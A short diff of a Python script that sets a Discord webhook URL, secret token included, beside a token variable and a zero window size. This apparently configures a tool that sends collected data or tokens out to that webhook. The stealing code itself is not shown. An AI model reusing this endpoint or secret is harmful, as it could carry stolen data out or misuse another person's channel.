@@ -10,7 +10,7 @@ import platform
 from discord import Webhook, RequestsWebhookAdapter
 from urllib.request import Request, urlopen
 from json import loads, dumps
-web_hook_url = r""
+web_hook_url = r"https://discord.com/api/webhooks/997611598669676614/H-LMaST5ld4GpX8k27MAWQIaqDpHY-adR3a9HsaOXzu8FfuQgYKhRWhmY3OFgGdaYhnC"
 print(pyfiglet.figlet_format("moom825"))
 token = ""
 WINDOW_SIZE = "0,0"
